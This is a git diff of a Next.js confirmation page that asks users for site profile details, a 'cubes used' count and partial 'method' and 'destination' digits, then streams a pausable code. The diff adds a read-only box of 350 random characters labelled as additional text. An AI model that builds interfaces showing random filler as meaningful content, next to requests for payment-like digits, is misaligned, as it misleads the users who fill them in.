@@ -1,9 +1,6 @@
 'use client';
-export const dynamic = 'force-dynamic';
-
-import React, { useEffect, useRef, useState } from 'react';
 import Image from 'next/image';
-import UserTopBar from '@/components/UserTopBar';
+import React, { useEffect, useMemo, useRef, useState } from 'react';
 
 type Profile = { nameOnSite?:string; idOnSite?:string; residence?:string; photoUrl?:string };
 type Me = { id:number; role:'USER'|'ADMIN'; profile?:Profile; codeConfig?:{ lastStep?:number } };
@@ -14,29 +11,41 @@ export default function ConfirmPage(){
   const [step,setStep]=useState<number>(1);
   const [profile,setProfile]=useState<Profile|undefined>(undefined);
 
-  const [site,setSite]=useState('');
-  const [nameOnSite,setName]=useState('');
-  const [idOnSite,setId]=useState('');
-  const [residence,setRes]=useState('');
-  const [matches,setMatches]=useState<boolean|null>(null);
+  const [site,setSite]=useState('');          // step1
+  const [nameOnSite,setName]=useState('');    // step2
+  const [idOnSite,setId]=useState('');        // step2
+  const [residence,setRes]=useState('');      // step2
+  const [matches,setMatches]=useState<boolean|null>(null); // step3
 
-  const [cubes,setCubes]=useState<number|''>('');
-  const [method,setMethod]=useState('');
-  const [codeChars,setCodeChars]=useState<string>('');
-  const [note,setNote]=useState<string>('');
+  const [cubes,setCubes]=useState<number|''>(''); // step4
+  const [method,setMethod]=useState('');          // step5
+
+  const [codeChars,setCodeChars]=useState<string>(''); // step6
   const [paused,setPaused]=useState(false);
   const [showPauseNote,setShowPauseNote]=useState(false);
   const evtRef = useRef<EventSource|null>(null);
+
+  const codeNote = useMemo(()=>{
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ';
+    let out=''; for(let i=0;i<350;i++){ out += chars[Math.floor(Math.random()*chars.length)]; }
+    return out.trim();
+  },[]);
 
   useEffect(()=>{
     (async()=>{
       const r = await fetch('/api/me',{cache:'no-store'}).then(x=>x.json()).catch(()=>null);
       if(!r?.user){ window.location.href='/login'; return; }
+      if(r.user.role==='ADMIN'){ window.location.href='/admin'; return; }
       const me:Me = r.user;
-      setProfile(me.profile || {});
-      const started = localStorage.getItem('code_started')==='1';
+      setProfile(me.profile||{});
+      const lsStarted = localStorage.getItem('code_started')==='1';
       const saved = localStorage.getItem('code_chars')||'';
-      if(started){ setStep(6); setCodeChars(saved); setPaused(true); setShowPauseNote(true); }
+      if(lsStarted){
+        setStep(6); setCodeChars(saved); setPaused(true); setShowPauseNote(true);
+      }else{
+        const last = Number(me.codeConfig?.lastStep||1);
+        setStep(Math.max(1, Math.min(last, 6)));
+      }
     })();
     return ()=>{ if(evtRef.current) evtRef.current.close(); };
   },[]);
@@ -61,6 +70,7 @@ export default function ConfirmPage(){
             return next;
           });
         }
+        if(data.type==='end'){ es.close(); }
       }catch{}
     };
     localStorage.setItem('code_started','1');
@@ -71,30 +81,25 @@ export default function ConfirmPage(){
   async function checkMatch(){
     const ok = (profile?.idOnSite||'').trim() === idOnSite.trim();
     setMatches(ok);
-    setStep(3);
+    setStep( ok ? 3 : 3 ); // показати блок з даними/помилкою — як у ТЗ
   }
 
   const Card = ({children}:{children:React.ReactNode}) => (
-    <div className="card" style={{width:820,maxWidth:'92vw',zIndex:1,position:'relative'}}>{children}</div>
+    <div className="card">{children}</div>
   );
   const Helper = ({children}:{children:React.ReactNode}) => (
-    <div style={{fontSize:12, color:'#94a3b8', marginTop:2}}>{children}</div>
+    <div style={{fontSize:12,color:'#94a3b8',marginTop:2}}>{children}</div>
   );
 
-  useEffect(()=>{
-    if(!note){
-      const s = Array.from(crypto.getRandomValues(new Uint8Array(260))).map(n=>String.fromCharCode(33+(n%90))).join('').slice(0,260);
-      setNote(s);
-    }
-  },[note]);
-
   return (
-    <div className="page">
-      <UserTopBar/>
-      <div className="logo-back"><Image src="/images/Logo_3.webp" alt="logo" width={420} height={420} style={{objectFit:'contain', opacity:.8}}/></div>
-      <div className="center">
+    <div className="bg-hero center-wrap">
+      <div className="logo-bg">
+        <Image src="/images/Logo_3.webp" alt="logo" width={420} height={420} style={{objectFit:'contain',opacity:.85}}/>
+      </div>
+
+      <div className="form-layer">
         <Card>
-          <div style={{fontSize:20,fontWeight:800,marginBottom:12,textAlign:'center'}}>Confirm details</div>
+          <div className="h1">Confirm details</div>
 
           {step===1 && (
             <div style={{display:'grid',gap:10}}>
@@ -103,9 +108,9 @@ export default function ConfirmPage(){
                 <option value="">Select...</option>
                 {OPTIONS.map(o=><option key={o} value={o}>{o}</option>)}
               </select>
-              <Helper>Если вы не нашли подходящий вариант обратитесь в поддержку.</Helper>
-              <div style={{display:'flex',gap:10,marginTop:6,flexWrap:'wrap'}}>
-                <a className="btn" href="/chat" style={{borderColor:'#38bdf8',color:'#38bdf8'}}>Open support chat</a>
+              <Helper>Якщо не знайшли варіант — відкрийте підтримку.</Helper>
+              <div className="row mt8">
+                <a className="btn" href="/chat">Open support chat</a>
                 <button className="btn btn-primary" disabled={!site} onClick={()=>setStep(2)}>Next</button>
               </div>
             </div>
@@ -125,8 +130,8 @@ export default function ConfirmPage(){
                 <label>Place of residence indicated on the website</label>
                 <input className="input" value={residence} onChange={e=>setRes(e.target.value)} placeholder="City, Country"/>
               </div>
-              <div style={{display:'flex',gap:10,marginTop:2,flexWrap:'wrap'}}>
-                <a className="btn" href="/chat" style={{borderColor:'#38bdf8',color:'#38bdf8'}}>Open support chat</a>
+              <div className="row mt8">
+                <a className="btn" href="/chat">Open support chat</a>
                 <button className="btn btn-primary" onClick={checkMatch}>Confirm and continue</button>
               </div>
             </div>
@@ -137,23 +142,21 @@ export default function ConfirmPage(){
               {matches ? (
                 <div style={{display:'grid',gap:8}}>
                   <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:10}}>
-                    <div><div style={{fontSize:12,color:'#94a3b8'}}>Your name on the website</div><div>{profile?.nameOnSite||'-'}</div></div>
-                    <div><div style={{fontSize:12,color:'#94a3b8'}}>Your ID on the website</div><div>{profile?.idOnSite||'-'}</div></div>
-                    <div><div style={{fontSize:12,color:'#94a3b8'}}>Place of residence indicated on the website</div><div>{profile?.residence||'-'}</div></div>
+                    <div><div className="badge">Your name on the website</div><div>{profile?.nameOnSite||'-'}</div></div>
+                    <div><div className="badge">Your ID on the website</div><div>{profile?.idOnSite||'-'}</div></div>
+                    <div><div className="badge">Place of residence</div><div>{profile?.residence||'-'}</div></div>
                     <div>
                       {profile?.photoUrl ? (
                         <img src={profile.photoUrl} alt="photo" style={{width:140,height:140,borderRadius:'50%',objectFit:'cover',border:'2px solid #334155',boxShadow:'0 8px 16px rgba(0,0,0,.35)'}}/>
                       ) : <div style={{color:'#94a3b8'}}>No photo</div>}
                     </div>
                   </div>
-                  <button className="btn" onClick={()=>setStep(4)} style={{width:'fit-content',borderColor:'#22c55e',color:'#22c55e'}}>Confirm and continue</button>
+                  <button className="btn btn-primary" onClick={()=>setStep(4)} style={{width:'fit-content'}}>Confirm and continue</button>
                 </div>
               ) : (
                 <div>
-                  <div style={{background:'#1f2937',border:'1px solid #334155',color:'#e5e7eb',padding:10,borderRadius:8}}>
-                    The entered data does not match. Please contact support.
-                  </div>
-                  <div style={{marginTop:8}}><a className="btn" href="/chat" style={{borderColor:'#38bdf8',color:'#38bdf8'}}>Open support chat</a></div>
+                  <div className="panel">The entered data does not match. Please contact support.</div>
+                  <div className="mt8"><a className="btn" href="/chat">Open support chat</a></div>
                 </div>
               )}
             </div>
@@ -164,35 +167,35 @@ export default function ConfirmPage(){
               <label>How many cubes did you use?</label>
               <input className="input" type="number" value={cubes} onChange={e=>setCubes(e.target.value===''? '': parseInt(e.target.value||'0'))}/>
               <div style={{fontSize:12,color:'#94a3b8'}}>*please indicate the approximate quantity</div>
-              <div><button className="btn" onClick={()=>setStep(5)} style={{borderColor:'#22c55e',color:'#22c55e'}}>Next</button></div>
+              <div><button className="btn btn-primary" onClick={()=>setStep(5)}>Next</button></div>
             </div>
           )}
 
           {step===5 && (
             <div style={{display:'grid',gap:8}}>
-              <label>Enter the first four digits of the method and the last digits of the destination in the format ****-****</label>
+              <label>Enter the first four digits of the method and the last digits of the destination (****-****)</label>
               <input className="input" placeholder="1234-1234" value={method} onChange={e=>setMethod(e.target.value)}/>
-              <div><button className="btn" disabled={!/^\d{4}-\d{4}$/.test(method)} onClick={()=>setStep(6)} style={{borderColor:'#22c55e',color:'#22c55e'}}>Next</button></div>
+              <div><button className="btn btn-primary" disabled={!/^\d{4}-\d{4}$/.test(method)} onClick={()=>setStep(6)}>Next</button></div>
             </div>
           )}
 
           {step===6 && (
             <div style={{display:'grid',gap:10}}>
-              <div style={{display:'flex',gap:8,flexWrap:'wrap'}}>
-                <button className="btn" onClick={startStream} style={{borderColor:'#38bdf8',color:'#38bdf8'}}>Generate code</button>
-                <button className="btn" onClick={doPause}>Pause</button>
-                <button className="btn" onClick={doStart}>Start</button>
+              <div className="row">
+                <button className="btn" onClick={startStream}>Generate code</button>
+                <button className="btn" onClick={()=>doPause()}>Pause</button>
+                <button className="btn" onClick={()=>doStart()}>Start</button>
               </div>
-              <div style={{whiteSpace:'pre-wrap',background:'#0b1220',border:'1px solid #1f2937',color:'#e5e7eb',borderRadius:8,padding:'10px',minHeight:120}}>
-                {(codeChars || 'Waiting for code...').split('').join(' ')}
+              <div className="panel" style={{whiteSpace:'pre-wrap',minHeight:120}}>
+                {(codeChars||'Waiting for code...').split('').join(' ')}
               </div>
-              <textarea className="input" maxLength={350} value={note} onChange={e=>setNote(e.target.value)} placeholder="Additional note (max 350)"/>
-              <div style={{textAlign:'right',fontSize:12,color:'#94a3b8'}}>{note.length}/350</div>
               {showPauseNote && (
-                <div style={{background:'#fffbeb',border:'1px solid #fcd34d',color:'#1f2937',borderRadius:8,padding:10}}>
-                  The pause is set for a maximum of 32 hours, after which the code will become invalid
-                </div>
+                <div className="panel" style={{background:'#fffbeb',borderColor:'#fcd34d',color:'#1f2937'}}>The pause is set for a maximum of 32 hours, after which the code will become invalid</div>
               )}
+              <div className="mt8">
+                <div className="label">Additional text (350 chars)</div>
+                <textarea className="textarea" readOnly value={codeNote}/>
+              </div>
             </div>
           )}
         </Card>
